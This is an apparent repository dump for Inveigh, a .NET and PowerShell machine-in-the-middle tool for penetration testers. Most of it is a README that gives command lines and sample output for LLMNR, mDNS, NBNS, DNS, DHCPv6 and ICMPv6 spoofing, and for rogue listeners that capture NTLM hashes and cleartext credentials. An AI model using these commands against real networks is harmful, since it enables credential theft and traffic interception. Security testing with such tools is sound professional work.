X86, Amd64, IA64) required by this module\nProcessorArchitecture = ''\n\n# Modules that must be imported into the global environment prior to importing this module\nRequiredModules = @()\n\n# Assemblies that must be loaded prior to importing this module\nRequiredAssemblies = @()\n\n# Script files (.ps1) that are run in the caller's environment prior to importing this module\nScriptsToProcess = @()\n\n# Type files (.ps1xml) to be loaded when importing this module\nTypesToProcess = @()\n\n# Format files (.ps1xml) to be loaded when importing this module\nFormatsToProcess = @()\n\n# Modules to import as nested modules of the module specified in ModuleToProcess\nNestedModules = @()\n\n# Functions to export from this module\nFunctionsToExport = '*'\n\n# Cmdlets to export from this module\nCmdletsToExport = '*'\n\n# Variables to export from this module\nVariablesToExport = '*'\n\n# Aliases to export from this module\nAliasesToExport = '*'\n\n# List of all modules packaged with this module\nModuleList = @()\n\n# List of all files packaged with this module\nFileList = @()\n\n# Private data to pass to the module specified in ModuleToProcess\nPrivateData = ''\n\n}\n\n"
        },
        {
          "name": "Inveigh.psm1",
          "type": "blob",
          "size": 0.21484375,
          "content": "<#\n.SYNOPSIS\nInveigh is a Windows PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer/man-in-the-middle tool.\n\n.LINK\nhttps://github.com/Kevin-Robertson/Inveigh\n#>\nImport-Module $PWD\\Inveigh.ps1\nImport-Module $PWD\\Inveigh-Relay.ps1"
        },
        {
          "name": "Inveigh.sln",
          "type": "blob",
          "size": 1.0751953125,
          "content": "\nMicrosoft Visual Studio Solution File, Format Version 12.00\n# Visual Studio Version 16\nVisualStudioVersion = 16.0.30804.86\nMinimumVisualStudioVersion = 10.0.40219.1\nProject(\"{9A19103F-16F7-4668-BE54-9A1E7A4F7556}\") = \"Inveigh\", \"Inveigh\\Inveigh.csproj\", \"{84A26089-F5CA-41D1-B92A-B60994A5C714}\"\nEndProject\nGlobal\n\tGlobalSection(SolutionConfigurationPlatforms) = preSolution\n\t\tDebug|Any CPU = Debug|Any CPU\n\t\tRelease|Any CPU = Release|Any CPU\n\tEndGlobalSection\n\tGlobalSection(ProjectConfigurationPlatforms) = postSolution\n\t\t{84A26089-F5CA-41D1-B92A-B60994A5C714}.Debug|Any CPU.ActiveCfg = Debug|Any CPU\n\t\t{84A26089-F5CA-41D1-B92A-B60994A5C714}.Debug|Any CPU.Build.0 = Debug|Any CPU\n\t\t{84A26089-F5CA-41D1-B92A-B60994A5C714}.Release|Any CPU.ActiveCfg = Release|Any CPU\n\t\t{84A26089-F5CA-41D1-B92A-B60994A5C714}.Release|Any CPU.Build.0 = Release|Any CPU\n\tEndGlobalSection\n\tGlobalSection(SolutionProperties) = preSolution\n\t\tHideSolutionNode = FALSE\n\tEndGlobalSection\n\tGlobalSection(ExtensibilityGlobals) = postSolution\n\t\tSolutionGuid = {CC6C55F7-3612-49FC-B6F8-B8BF7AB9866E}\n\tEndGlobalSection\nEndGlobal\n"
        },
        {
          "name": "Inveigh",
          "type": "tree",
          "content": null
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 1.478515625,
          "content": "BSD 3-Clause License\n\nCopyright (c) 2024, Kevin Robertson\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without\nmodification, are permitted provided that the following conditions are met:\n\n* Redistributions of source code must retain the above copyright notice, this\n  list of conditions and the following disclaimer.\n\n* Redistributions in binary form must reproduce the above copyright notice,\n  this list of conditions and the following disclaimer in the documentation\n  and/or other materials provided with the distribution.\n\n* Neither the name of the copyright holder nor the names of its\n  contributors may be used to endorse or promote products derived from\n  this software without specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\nAND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\nIMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\nDISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE\nFOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\nDAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\nSERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\nCAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\nOR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\nOF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 19.685546875,
          "content": "# Inveigh\n\nInveigh is a cross-platform .NET IPv4/IPv6 machine-in-the-middle tool for penetration testers. This repo contains the primary C# version as well as the legacy PowerShell version.  \n\n## Overview\n\nInveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. The packet sniffing method, which was the basis for the original PowerShell version of this tool, has the following advantages:\n\n* SMB NTLM challenge/response captures over the Window's SMB service\n* Fewer visible port binds on the host system\n\nThe primary disadvantage is the required elevated access.\n\nOn current versions of Windows, the default running UDP services allow port reuse. Therefore, packet sniffing no longer provides an advantage for getting around in-use UDP ports. Inveigh's UDP listeners are all configured to take advantage of port reuse.\n\n### Version Descriptions\n* **PowerShell Inveigh** - original version developed over many years. For now at least, this version (1.506) will go without additional updates. Documentation can be found [here](https://github.com/Kevin-Robertson/Inveigh/wiki).\n* **C# Inveigh (aka InveighZero)** - original C# POC code combined with a C# port of most of the PowerShell version's code. This version has now been rebuilt for C# and is taking over as the primary version. \n\n### Features\n\nThe C# version of Inveigh contains attacks for the following protocols:\n\n* [LLMNR](#LLMNR) [packet sniffer | listener]\n* [DNS](#DNS) [packet sniffer | listener]\n* [mDNS](#mDNS) [packet sniffer | listener]\n* [NBNS](#NBNS) [packet sniffer | listener]\n* [DHCPv6](#DHCPv6) [packet sniffer | listener]\n* [ICMPv6](#ICMPv6) [privileged raw socket]\n* [HTTP](#HTTP) [listener]\n* [HTTPS](#HTTPS) [listener]\n* [SMB](#SMB) [packet sniffer | listener]\n* [LDAP](#LDAP) [listener]\n* [WebDAV](#WebDAV) [listener]\n* [Proxy Auth](#Proxy) [listener]\n \nInveigh works with both IPv4 and IPv6 in cases where support for both is provided by the underlying protocol.\n\n## Cross-Platform Support\n\nInveigh's SDK style project file is setup for .NET 3.5, 4.6.2, and 6.0 with 6.0 being the version that also works with Linux and macOS.  \n\n`<TargetFrameworks>net35;net62;net6.0</TargetFrameworks>`\n\n### Known Issues\n\n* The packet sniffer is available only on Windows due to differences in the raw socket setups. When compiled for either Linux or macOS, the packet sniffer will just be disabled. Instead, Inveigh's SMB listener can be used if port 445 is open.\n* macOS requires that routes are available for joining multicast groups. In my testing, I've had to add routes for DHCPv6 multicast in order to carry out that attack on this platform.  \n `sudo route -nv add -net ff02::1:2 -interface en0`\n \n### Execution\n\n`dotnet Inveigh.dll`\n\n### Linux/macOS Platform Targeted Builds \n\n* With .NET 6.0 installed on target system  \n`dotnet publish -r linux-x64 -f net8.0 -p:AssemblyName=inveigh`  \n`dotnet publish -r osx-x64 -f net8.0 -p:AssemblyName=inveigh`  \n\n* Without .NET 6.0 installed on target system  \n`dotnet publish --self-contained=true -p:PublishSingleFile=true -r linux-x64 -f net8.0 -p:AssemblyName=inveigh`  \n`dotnet publish --self-contained=true -p:PublishSingleFile=true -r osx-x64 -f net8.0 -p:AssemblyName=inveigh`  \n\n## Usage\n\nDefault parameter values are located at the beginning of Program.cs. I recommend reviewing and setting everything to fit your needs before compile. All enable/disable parameters can be set with `Y/N` values.\n\n```\n    //begin parameters - set defaults as needed before compile\n    public static string argCert = \"MIIKaQIBAzCCC...\"\n    public static string argCertPassword = \"password\";\n    public static string argChallenge = \"\";\n    public static string argConsole = \"5\";\n    public static string argConsoleLimit = \"-1\";\n    public static string argConsoleStatus = \"0\";\n    public static string argConsoleUnique = \"Y\";\n    public static string argDHCPv6 = \"N\";\n    public static string argDHCPv6TTL = \"30\";\n    public static string argDNS = \"Y\";\n    ...\n    //end parameters\n```\n\n### Parameter Help\n\n```\n.\\Inveigh.exe -?\n\nControl:\n\n  -Inspect        Default=Disabled: (Y/N) inspect traffic only.\n\n  -IPv4           Default=Enabled: (Y/N) IPv4 spoofing/capture.\n\n  -IPv6           Default=Enabled: (Y/N) IPv6 spoofing/capture.\n\n  -RunCount       Default=Unlimited: Number of NetNTLM captures to perform before auto-exiting.\n\n  -RunTime        Default=Unlimited: Run time duration in minutes.\n\n\nOutput:\n\n  -Console        Default=5: Set the level for console output. (0=none, 1=only captures/spoofs, 2=no disabled, no informational, 3=no disabled, no filtered, 4=no disabled, 5=all)  \n\n  -ConsoleLimit   Default=Unlimited: Limit to queued console entries.\n\n  -ConsoleStatus  Default=Disabled: Interval in minutes for auto-displaying capture details.\n\n  -ConsoleUnique  Default=Enabled: (Y/N) displaying only unique (user and system combination) hashes at time of capture.\n\n  -FileDirectory  Default=Working Directory: Valid path to an output directory for enabled file output.\n\n  -FileOutput     Default=Enabled: (Y/N) real time file output.\n\n  -FilePrefix     Default=Inveigh: Prefix for all output files.\n\n  -FileUnique     Default=Enabled: (Y/N) outputting only unique (user and system combination) hashes.\n\n  -LogOutput      Default=Disabled: (Y/N) outputting log entries.\n\n\nSpoofers:\n\n  -DHCPV6         Default=Disabled: (Y/N) DHCPv6 spoofing.\n\n  -DHCPv6TTL      Default=300: Lease lifetime in seconds.\n\n  -DNS            Default=Enabled: (Y/N) DNS spoofing.\n\n  -DNSHost        Fully qualified hostname to use SOA/SRV responses.\n\n  -DNSSRV         Default=LDAP: Comma separated list of SRV request services to answer.\n\n  -DNSSuffix      DNS search suffix to include in DHCPv6/ICMPv6 responses.\n\n  -DNSTTL         Default=30: DNS TTL in seconds.\n\n  -DNSTYPES       Default=A: (A, AAAA, SOA, SRV) Comma separated list of DNS types to spoof.\n\n  -ICMPv6         Default=Enabled: (Y/N) sending ICMPv6 router advertisements.\n\n  -ICMPv6Interval Default=200: ICMPv6 RA interval in seconds.\n  \n  -ICMPv6TTL\t  Default=300: ICMPv6 TTL in seconds.\n\n  -IgnoreDomains  Default=None: Comma separated list of domains to ignore when spoofing.\n\n\n\n  -IgnoreIPs      Default=Local: Comma separated list of source IP addresses to ignore when spoofing.\n\n  -IgnoreMACs     Default=Local: Comma separated list of MAC addresses to ignore when DHCPv6 spoofing.\n  \n  -IgnoreQueries  Default=None: Comma separated list of name queries to ignore when spoofing.\n\n  -Local          Default=Disabled: (Y/N) performing spoofing attacks against the host system.\n\n  -LLMNR          Default=Enabled: (Y/N) LLMNR spoofing.\n\n  -LLMNRTTL       Default=30: LLMNR TTL in seconds.\n\n  -MAC            Local MAC address for DHCPv6.\n\n  -MDNS           Default=Enabled: (Y/N) mDNS spoofing.\n\n  -MDNSQuestions  Default=QU,QM: Comma separated list of question types to spoof. (QU,QM)\n\n  -MDNSTTL        Default=120: mDNS TTL in seconds.\n\n  -MDNSTypes      Default=A: Comma separated list of mDNS record types to spoof. (A,AAAA,ANY)\n\n  -MDNSUnicast    Default=Enabled: (Y/N) sending a unicast only response to a QM request.\n\n  -NBNS           Default=Disabled: (Y/N) NBNS spoofing.\n\n  -NBNSTTL        Default=165: NBNS TTL in seconds.\n\n  -NBNSTypes      Default=00,20: Comma separated list of NBNS types to spoof. (00,03,20,1B)\n\n  -ReplyToDomains Default=All: Comma separated list of domains to respond to when spoofing.\n\n  -ReplyToIPs     Default=All: Comma separated list of source IP addresses to respond to when spoofing.\n\n  -ReplyToMACs    Default=All: Comma separated list of MAC addresses to respond to when DHCPv6 spoofing.\n  \n  -ReplyToQueries Default=All: Comma separated list of name queries to respond to when spoofing.\n\n  -SpooferIP      Default=Autoassign: IP address included in spoofing responses.\n\n  -SpooferIPv6    Default=Autoassign: IPv6 address included in spoofing responses.\n\n  -Repeat         Default=Enabled: (Y/N) repeated spoofing attacks against a system after NetNTLM capture.\n\n\nCapture:\n\n  -Cert           Base64 certificate for TLS.\n\n  -CertPassword   Base64 certificate password for TLS.\n\n  -Challenge      Default=Random per request: 16 character hex NetNTLM challenge for use with the TCP listeners.\n\n  -HTTP           Default=Enabled: (Y/N) HTTP listener.\n\n  -HTTPAuth       Default=NTLM: (Anonymous/Basic/NTLM) HTTP/HTTPS listener authentication.\n\n  -HTTPPorts      Default=80: Comma seperated list of TCP ports for the HTTP listener.\n\n  -HTTPRealm      Default=ADFS: Basic authentication realm.\n\n  -HTTPResponse   Content to serve as the default HTTP/HTTPS/Proxy response.\n\n  -HTTPS          Default=Enabled: (Y/N) HTTPS listener.\n\n  -HTTPSPorts     Default=443: Comma separated list of TCP ports for the HTTPS listener.\n\n  -IgnoreAgents   Default=Firefox: Comma separated list of HTTP user agents to ignore with wpad and proxy auth.\n\n  -LDAP           Default=Enabled: (Y/N) LDAP listener.\n\n  -LDAPPorts      Default=389: Comma separated list of TCP ports for the LDAP listener.\n\n  -ListenerIP     Default=Any: IP address for all listeners.\n\n  -ListenerIPv6   Default=Any: IPv6 address for all listeners.\n\n  -MachineAccount Default=Enabled: (Y/N) machine account NetNTLM captures.\n\n  -Proxy          Default=Disabled: (Y/N) proxy listener authentication captures.\n\n  -ProxyAuth      Default=NTLM: (Basic/NTLM) Proxy authentication.\n\n  -ProxyPort      Default=8492: Port for the proxy listener.\n\n  -SMB            Default=Enabled: (Y/N) SMB sniffer/listener.\n\n  -SMBPorts       Default=445: Port for the SMB listener.\n\n  -SnifferIP      Default=Autoassign: IP address included in spoofing responses.\n\n  -SnifferIPv6    Default=Autoassign: IPv6 address included in spoofing responses.\n\n  -WebDAV         Default=Enabled: (Y/N) serving WebDAV over HTTP/HTTPS listener.\n\n  -WebDAVAuth     Default=NTLM: (Anonymous/Basic/NTLM) WebDAV authentication.\n\n  -WPADAuth       Default=Enabled: (Y/N) authentication type for wpad.dat requests. (Anonymous/Basic/NTLM)\n\n  -WPADResponse   Default=Autogenerated: Contents of wpad.dat responses.\n```\n### Default (autodetect local IPs)\n```\n.\\Inveigh.exe\n[*] Inveigh 2.0 [Started 2021-06-15T00:08:37 | PID 12588]\n[+] Packet Sniffer Addresses [IP 10.10.2.111 | IPv6 fe80::3d3b:b73c:c43e:ed4e%2]\n[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]\n[+] Spoofer Reply Addresses [IP 10.10.2.111 | IPv6 fe80::3d3b:b73c:c43e:ed4e%2]\n[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]\n[-] DHCPv6\n[+] DNS Packet Sniffer [Type A]\n[-] ICMPv6\n[+] LLMNR Packet Sniffer [Type A]\n[-] MDNS\n[-] NBNS\n[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]\n[-] HTTPS\n[+] WebDAV [WebDAVAuth NTLM]\n[-] Proxy\n[+] LDAP Listener [Port 389]\n[+] SMB Packet Sniffer [Port 445]\n[+] File Output [C:\\Users\\dev\\source\\repos\\Inveigh\\Inveigh\\bin\\Debug\\net35]\n[+] Previous Session Files [Imported]\n[*] Press ESC to enter/exit interactive console\n```\n### Listener Only Mode (disabled packet sniffer)\n```\n.\\Inveigh.exe -sniffer n\n[*] Inveigh 2.0 [Started 2021-06-14T10:48:16 | PID 20368]\n[-] Packet Sniffer\n[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]\n[+] Spoofer Reply Addresses [IP 10.10.2.111 | IPv6 fe80::3d3b:b73c:c43e:ed4e%2]\n[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]\n[-] DHCPv6\n[+] DNS Listener [Type A]\n[-] ICMPv6\n[+] LLMNR Listener [Type A]\n[-] MDNS\n[-] NBNS\n[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]\n[-] HTTPS\n[+] WebDAV [WebDAVAuth NTLM]\n[-] Proxy\n[+] LDAP Listener [Port 389]\n[+] SMB Listener [Port 445]\n[+] File Output [C:\\Users\\dev\\source\\repos\\InveighZero\\Inveigh\\bin\\Debug\\net35]\n[+] Previous Session Files [Imported]\n[*] Press ESC to enter/exit interactive console\n[!] Failed to start SMB listener on port 445, check IP and port usage.\n[!] Failed to start SMB listener on port 445, check IP and port usage.\n```\nNote, with the packet sniffer disabled, Inveigh will attempt to start SMB listeners for IPv4 and IPv6. On most windows systems, port 445 will already be in use. Either ignore error or add `-smb n`.\n\n### <a name=\"DHCPv6\"></a>DHCPv6\n\nStart DHCPv6 spoofer and IPv6 DNS spoofer. Note, DNS is on by default.\n```\n.\\Inveigh.exe -dhcpv6 y\n...\n[+] DHCPv6 Listener [MAC 52:54:00:FF:B5:53]\n[+] DNS Listener [Type A]\n...\n[+] [23:03:06] DHCPv6 [solicitation] from fe80::bd92:a800:60d0:8deb%2(test-wks1.lab.inveigh.org) [response sent]\n[+] [23:03:06] DHCPv6 [fe80::1348:1] advertised to [00:0C:29:F0:6E:16]\n[+] [23:03:06] DHCPv6 [request] from fe80::bd92:a800:60d0:8deb%2(test-wks1.lab.inveigh.org) [response sent]\n[+] [23:03:06] DHCPv6 [fe80::1348:1] leased to [00:0C:29:F0:6E:16]\n```\nStart DHCPv6 spoofer and spoof DNS requests for internal domain only.\n```\n.\\Inveigh.exe -dhcpv6 y -replytodomains lab.inveigh.org\n...\n[+] DHCPv6 Listener [MAC 52:54:00:FF:B5:53]\n[+] DNS Listener [Type A]\n...\n[-] [23:10:30] DNS(A) request [test.inveigh.org] from fe80::6142:1%2 [domain ignored]\n[+] [23:10:33] DNS(A) request [wpad.lab.inveigh.org] from fe80::6142:1%2 [response sent]\n```\nStart DHCPv6 spoofer and also send out ICMPv6 RA packets.  \n```\n.\\Inveigh.exe -dhcpv6 y -icmpv6 y\n...\n[+] DHCPv6 Listener [MAC 52:54:00:FF:B5:53]\n[+] DNS Listener [Type A]\n[+] ICMPv6 Router Advertisement [Interval 200 Seconds]\n...\n[+] [23:12:04] ICMPv6 router advertisment sent to [ff02::1]\n```\nStart DHCPv6 spoofer and answer requests from the local host.\n```\n.\\Inveigh.exe -dhcpv6 y -local y\n...\n[+] Spoofer Options [Repeat Enabled | Local Attacks Enabled]\n[+] DHCPv6 Listener [MAC 52:54:00:FF:B5:53]\n```\n### <a name=\"DNS\"></a>DNS\nSpoof SRV requests in addition to A.\n```\n.\\Inveigh.exe -dnstypes A,SRV -dnshost fake.lab.inveigh.org\n...\n[+] DNS Listener [Types A:SRV]\n...\n[+] [23:21:05] DNS(SRV) request [_ldap._tcp.dc._msdcs.lab.inveigh.org] from fe80::242d:f99e:7534:b46f%2 [response sent]\n```\n### <a name=\"ICMPv6\"></a>ICMPv6\nSend ICMPv6 packets to inject a secondary IPv6 DNS server on local subnet systems.\n```\n.\\Inveigh.exe -icmpv6 y\n...\n[+] ICMPv6 Router Advertisement [Option DNS | Interval 200 Seconds]\n...\n[+] [23:35:46] ICMPv6 router advertisement with DNSv6 sent to [ff02::1]\n```\nSend ICMPv6 packets to inject an additional DNS search suffix on local subnet systems.\n```\n.\\Inveigh.exe -icmpv6 y -dnssuffix inveigh.net\n...\n[+] ICMPv6 Router Advertisement [Option DNS Suffix | Interval 200 Seconds]\n...\n[+] [23:41:17] ICMPv6 router advertisement with DNS Suffix sent to [ff02::1]\n```\n### <a name=\"LLMNR\"></a>LLMNR\nSpoof AAAA requests instead of A.\n```\n.\\Inveigh.exe -llmnrtypes AAAA\n...\n[+] LLMNR Listener [Type AAAA]\n...\n[-] [23:23:38] LLMNR(A) request [test] from fe80::bd92:a800:60d0:8deb%2 [type ignored]\n[-] [23:23:38] LLMNR(A) request [test] from 10.10.2.201 [type ignored]\n[+] [23:23:38] LLMNR(AAAA) request [test] from 10.10.2.201 [response sent]\n[+] [23:23:38] LLMNR(AAAA) request [test] from fe80::bd92:a800:60d0:8deb%2 [response sent]\n```\n### <a name=\"mDNS\"></a>mDNS\nStart mDNS spoofer and send unicast responses to QM requests.\n```\n.\\Inveigh.exe -mdns y\n...\n[+] MDNS Listener [Questions QU:QM | Type A]\n...\n[+] [23:25:58] mDNS(QM)(A) request [test.local] from fe80::bd92:a800:60d0:8deb%2 [response sent]\n[+] [23:25:58] mDNS(QM)(A) request [test.local] from 10.10.2.201 [response sent]\n[-] [23:25:58] mDNS(QM)(AAAA) request [test.local] from 10.10.2.201 [type ignored]\n[-] [23:25:58] mDNS(QM)(AAAA) request [test.local] from fe80::bd92:a800:60d0:8deb%2 [type ignored]\n```\nStart mDNS spoofer and send multicast responses to QM requests.\n```\n.\\Inveigh.exe -mdns y -mdnsunicast n\n...\n[+] MDNS Listener [Questions QU:QM | Type A]\n...\n[+] [23:28:26] mDNS(QM)(A) request [test.local] from 10.10.2.201 [response sent]\n[+] [23:28:26] mDNS(QM)(A) request [test.local] from fe80::bd92:a800:60d0:8deb%2 [response sent]\n```\n### <a name=\"NBNS\"></a>NBNS\nStart NBNS spoofer\n```\n.\\Inveigh.exe -nbns y\n...\n[+] NBNS Listener [Types 00:20]\n...\n[+] [23:33:09] NBNS(00) request [TEST] from 10.10.2.201 [response sent]\n```\n### <a name=\"HTTP\"></a>HTTP\nStart HTTP listener on port 80 (enabled by default)\n```\n.\\Inveigh.exe \n...\n[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]\n...\n```\nStart HTTP listeners on multiple ports\n```\n.\\Inveigh.exe -httpports 80,8080\n...\n[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Ports 80:8080]\n...\n```\n### <a name=\"HTTPS\"></a>HTTPS\nStart HTTPS listener on port 443 with Inveigh's default cert\n```\n.\\Inveigh.exe -https y\n...\n[+] HTTPS Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 443]\n...\n```\n### <a name=\"SMB\"></a>SMB\nStart SMB packet sniffer (enabled by default)\n```\n.\\Inveigh.exe\n...\n[+] SMB Packet Sniffer [Port 445]\n...\n```\nStart SMB listener on port 445\n```\n.\\Inveigh.exe -sniffer n\n...\n[+] SMB Listener [Port 445]\n...\n```\n### <a name=\"LDAP\"></a>LDAP\nStart LDAP listener on port 389\n```\n.\\Inveigh.exe\n...\n[+] LDAP Listener [Port 389]\n...\n```\n### <a name=\"WebDAV\"></a>WebDAV\nStart the HTTP listener with WebDAV support (enabled by default)\n```\n.\\Inveigh.exe\n...\n[+] WebDAV [WebDAVAuth NTLM]\n...\n```\n### <a name=\"Proxy\"></a>Proxy Auth\nEnable proxy auth capture on port 8492\n```\n.\\Inveigh.exe -proxy y\n...\n[+] Proxy Listener [ProxyAuth NTLM | Port 8492]\n...\n```\n## Console\n\nInveigh contains a console that is accessible while the tool is running (hit escape to enter and exit). The console provides easy access to captured credentials/hashes and other various information. The console's prompt provides real-time updates for cleartext, NTLMv1, and NTLMv2 captue counts in the format of unique:total. Note, the console may be inaccessible when running through C2. \n\n### Interactive Console Help - enter ? or HELP\n\n```\n=============================================== Inveigh Console Commands ===============================================\n\nCommand                           Description\n========================================================================================================================\nGET CONSOLE                     | get queued console output\nGET DHCPv6Leases                | get DHCPv6 assigned IPv6 addresses\nGET LOG                         | get log entries; add search string to filter results\nGET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter results\nGET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter results\nGET NTLMV1UNIQUE                | get one captured NTLMv1 hash per user; add search string to filter results\nGET NTLMV2UNIQUE                | get one captured NTLMv2 hash per user; add search string to filter results\nGET NTLMV1USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv1 hashes\nGET NTLMV2USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv2 hashes\nGET CLEARTEXT                   | get captured cleartext credentials\nGET CLEARTEXTUNIQUE             | get unique captured cleartext credentials\nGET REPLYTODOMAINS              | get ReplyToDomains parameter startup values\nGET REPLYTOIPS                  | get ReplyToIPs parameter startup values\nGET REPLYTOMACS                 | get ReplyToMACs parameter startup values\nGET REPLYTOQUERIES              | get ReplyToQueries parameter startup values\nGET IGNOREDOMAINS               | get IgnoreDomains parameter startup values\nGET IGNOREIPS                   | get IgnoreIPs parameter startup values\nGET IGNOREMACS                  | get IgnoreMACs parameter startup values\nGET IGNOREQUERIES               | get IgnoreQueries parameter startup values\nSET CONSOLE                     | set Console parameter value\nHISTORY                         | get command history\nRESUME                          | resume real time console output\nSTOP                            | stop Inveigh\n```\n### Interactive Console Prompt\nThe console prompt contains real time capture counts.\n```\nC(0:0) NTLMv1(0:0) NTLMv2(0:0)>\n```\nCleartext(unique:total) NTLMv1(unique:total) NTLMv2(unique:total)\n\n## Quiddity\n\nThe protocol library used by Inveigh is located [here](https://github.com/Kevin-Robertson/Quiddity).\n\n## Special Thanks  \n* Responder - https://github.com/lgandx/Responder  \n* Impacket - https://github.com/SecureAuthCorp/impacket  \n* mitm6 - https://github.com/fox-it/mitm6\n"
        }
      ]
    }
  ]
}